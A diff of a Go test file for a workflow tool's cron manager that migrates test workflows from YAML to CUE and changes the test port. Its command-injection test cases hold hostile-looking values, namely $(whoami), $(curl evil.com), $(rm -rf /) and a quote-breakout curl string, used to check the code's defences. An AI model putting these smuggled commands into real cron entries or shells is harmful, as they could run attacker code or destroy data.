@@ -59,13 +59,16 @@ func TestCronPathTraversal(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a valid workflow
-	testFlow := `name: test_workflow
-on: schedule.cron
-steps:
-  - id: test
-    use: core.echo`
+	testFlow := `package beemflow
 
-	flowPath := filepath.Join(tmpDir, "test_workflow.flow.yaml")
+name: "test_workflow"
+on: "schedule.cron"
+steps: [{
+	id: "test"
+	use: "core.echo"
+}]`
+
+	flowPath := filepath.Join(tmpDir, "test_workflow.flow.cue")
 	os.WriteFile(flowPath, []byte(testFlow), 0644)
 	SetFlowsDir(tmpDir)
 
@@ -101,7 +104,7 @@ steps:
 
 // TestCronURLEncoding tests that flow names are properly URL encoded
 func TestCronURLEncoding(t *testing.T) {
-	manager := NewCronManager("http://localhost:8080", "test-secret")
+	manager := NewCronManager("http://localhost:3330", "test-secret")
 
 	// We'll verify URL encoding directly without mocking exec.Command
 	_ = manager // manager would be used in real cron entry generation
@@ -111,11 +114,11 @@ func TestCronURLEncoding(t *testing.T) {
 		expectedURL string
 		desc        string
 	}{
-		{"simple", "http://localhost:8080/cron/simple", "simple name"},
-		{"with spaces", "http://localhost:8080/cron/with%20spaces", "name with spaces"},
-		{"special!@#$%", "http://localhost:8080/cron/special%21@%23$%25", "special characters"},
-		{"path/to/flow", "http://localhost:8080/cron/path%2Fto%2Fflow", "slash in name"},
-		{"unicode-日本語", "http://localhost:8080/cron/unicode-%E6%97%A5%E6%9C%AC%E8%AA%9E", "unicode characters"},
+		{"simple", "http://localhost:3330/cron/simple", "simple name"},
+		{"with spaces", "http://localhost:3330/cron/with%20spaces", "name with spaces"},
+		{"special!@#$%", "http://localhost:3330/cron/special%21@%23$%25", "special characters"},
+		{"path/to/flow", "http://localhost:3330/cron/path%2Fto%2Fflow", "slash in name"},
+		{"unicode-日本語", "http://localhost:3330/cron/unicode-%E6%97%A5%E6%9C%AC%E8%AA%9E", "unicode characters"},
 	}
 
 	for _, tc := range testCases {
@@ -123,7 +126,7 @@ func TestCronURLEncoding(t *testing.T) {
 			// This would be called internally when building cron entries
 			// We're testing that the URL is properly encoded
 			encodedName := url.PathEscape(tc.flowName)
-			actualURL := fmt.Sprintf("http://localhost:8080/cron/%s", encodedName)
+			actualURL := fmt.Sprintf("http://localhost:3330/cron/%s", encodedName)
 			assert.Equal(t, tc.expectedURL, actualURL)
 		})
 	}
@@ -138,25 +141,25 @@ func TestCronCommandInjection(t *testing.T) {
 		desc       string
 	}{
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret$(whoami)",
 			flowName:   "test",
 			desc:       "command injection in secret",
 		},
 		{
-			serverURL:  "http://localhost:8080$(curl evil.com)",
+			serverURL:  "http://localhost:3330$(curl evil.com)",
 			cronSecret: "secret",
 			flowName:   "test",
 			desc:       "command injection in server URL",
 		},
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret",
 			flowName:   "test$(rm -rf /)",
 			desc:       "command injection in flow name",
 		},
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret'||curl evil.com||'",
 			flowName:   "test",
 			desc:       "single quote injection in secret",
@@ -199,50 +202,54 @@ func TestCron_GlobalEndpoint(t *testing.T) {
 	// Test workflows
 	testFlows := []struct {
 		name          string
-		yaml          string
+		cue           string
 		shouldTrigger bool
 	}{
 		{
 			name: "scheduled_workflow",
-			yaml: `name: scheduled_workflow
-on: schedule.cron
-steps:
-  - id: test
-    use: core.echo
-    with:
-      text: "Scheduled task"`,
+			cue: `name: "scheduled_workflow"
+on: "schedule.cron"
+steps: [{
+	id: "test"
+	use: "core.echo"
+	with: {
+		text: "Scheduled task"
+	}
+}]`,
 			shouldTrigger: true,
 		},
 		{
 			name: "http_workflow",
-			yaml: `name: http_workflow
-on: http.request
-steps:
-  - id: test
-    use: core.echo
-    with:
-      text: "HTTP triggered"`,
+			cue: `name: "http_workflow"
+on: "http.request"
+steps: [{
+	id: "test"
+	use: "core.echo"
+	with: {
+		text: "HTTP triggered"
+	}
+}]`,
 			shouldTrigger: false,
 		},
 		{
 			name: "multi_trigger_with_cron",
-			yaml: `name: multi_trigger_with_cron
-on:
-  - schedule.cron
-  - http.request
-steps:
-  - id: test
-    use: core.echo
-    with:
-      text: "Multi-trigger"`,
+			cue: `name: "multi_trigger_with_cron"
+on: ["schedule.cron", "http.request"]
+steps: [{
+	id: "test"
+	use: "core.echo"
+	with: {
+		text: "Multi-trigger"
+	}
+}]`,
 			shouldTrigger: true,
 		},
 	}
 
 	// Create test workflow files
 	for _, tf := range testFlows {
-		filePath := filepath.Join(tempDir, tf.name+".flow.yaml")
-		if err := os.WriteFile(filePath, []byte(tf.yaml), 0644); err != nil {
+		filePath := filepath.Join(tempDir, tf.name+".flow.cue")
+		if err := os.WriteFile(filePath, []byte(tf.cue), 0644); err != nil {
 			t.Fatalf("Failed to write test flow %s: %v", tf.name, err)
 		}
 	}
@@ -300,17 +307,20 @@ func TestCron_TriggerWorkflow(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a workflow with schedule.cron trigger
-	testFlow := `name: test_cron_workflow
-on: schedule.cron
+	testFlow := `package beemflow
+
+name: "test_cron_workflow"
+on: "schedule.cron"
 cron: "0 9 * * *"
 
-steps:
-  - id: echo
-    use: core.echo
-    with:
-      text: "Hello from cron!"
-`
-	flowPath := filepath.Join(tmpDir, "test_cron_workflow.flow.yaml")
+steps: [{
+	id: "echo"
+	use: "core.echo"
+	with: {
+		text: "Hello from cron!"
+	}
+}]`
+	flowPath := filepath.Join(tmpDir, "test_cron_workflow.flow.cue")
 	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
 	require.NoError(t, err)
 
@@ -349,17 +359,20 @@ func TestCron_SpecificWorkflow(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a workflow with schedule.cron trigger
-	testFlow := `name: specific_workflow
-on: schedule.cron
+	testFlow := `package beemflow
+
+name: "specific_workflow"
+on: "schedule.cron"
 cron: "0 * * * *"
 
-steps:
-  - id: echo
-    use: core.echo
-    with:
-      text: "Specific workflow triggered!"
-`
-	flowPath := filepath.Join(tmpDir, "specific_workflow.flow.yaml")
+steps: [{
+	id: "echo"
+	use: "core.echo"
+	with: {
+		text: "Specific workflow triggered!"
+	}
+}]`
+	flowPath := filepath.Join(tmpDir, "specific_workflow.flow.cue")
 	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
 	require.NoError(t, err)
 
@@ -398,16 +411,18 @@ func TestCron_ValidationError(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a workflow WITHOUT schedule.cron trigger
-	testFlow := `name: non_cron_workflow
-on: http.request
+	testFlow := `package beemflow
 
-steps:
-  - id: echo
-    use: core.echo
-    with:
-      text: "Not a cron workflow"
-`
-	flowPath := filepath.Join(tmpDir, "non_cron_workflow.flow.yaml")
+name: "non_cron_workflow"
+on: "http.request"
+steps: [{
+	id: "echo"
+	use: "core.echo"
+	with: {
+		text: "Not a cron workflow"
+	}
+}]`
+	flowPath := filepath.Join(tmpDir, "non_cron_workflow.flow.cue")
 	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
 	require.NoError(t, err)
 
@@ -424,7 +439,7 @@ steps:
 
 	op.HTTPHandler(w, req)
 
-	// Should get bad request
+	// Should get bad request (workflow exists but doesn't have schedule.cron trigger)
 	assert.Equal(t, http.StatusBadRequest, w.Code)
 }
 
@@ -435,13 +450,15 @@ func TestCron_ErrorHandling(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a workflow that will fail (missing required step)
-	testFlow := `name: failing_workflow
-on: schedule.cron
-steps:
-  - id: fail_step
-    use: non.existent.tool
-`
-	flowPath := filepath.Join(tmpDir, "failing_workflow.flow.yaml")
+	testFlow := `package beemflow
+
+name: "failing_workflow"
+on: "schedule.cron"
+steps: [{
+	id: "fail_step"
+	use: "non.existent.tool"
+}]`
+	flowPath := filepath.Join(tmpDir, "failing_workflow.flow.cue")
 	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
 	require.NoError(t, err)
 
@@ -483,13 +500,16 @@ func TestCron_Security(t *testing.T) {
 	defer os.RemoveAll(tmpDir)
 
 	// Create a workflow
-	testFlow := `name: secure_workflow
-on: schedule.cron
-steps:
-  - id: test
-    use: core.echo`
+	testFlow := `package beemflow
 
-	flowPath := filepath.Join(tmpDir, "secure_workflow.flow.yaml")
+name: "secure_workflow"
+on: "schedule.cron"
+steps: [{
+	id: "test"
+	use: "core.echo"
+}]`
+
+	flowPath := filepath.Join(tmpDir, "secure_workflow.flow.cue")
 	os.WriteFile(flowPath, []byte(testFlow), 0644)
 	SetFlowsDir(tmpDir)
 
